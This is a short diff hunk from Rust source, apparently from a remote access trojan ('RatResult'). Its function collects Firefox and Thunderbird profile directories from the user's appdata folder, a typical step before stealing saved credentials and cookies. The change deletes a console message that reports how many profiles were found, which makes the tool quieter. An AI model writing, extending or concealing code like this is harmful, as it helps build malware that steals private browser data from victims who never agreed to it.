@@ -1591,7 +1591,7 @@ fn get_firefox_profiles() -> RatResult<Vec<std::path::PathBuf>> {
         let thunderbird_dir = appdata_path.join("Thunderbird").join("Profiles");
         profiles.extend(scan_firefox_directory(&thunderbird_dir));
         
-        println!("🔍 Found {} Firefox/Thunderbird profiles", profiles.len());
+
     }
     
     Ok(profiles)
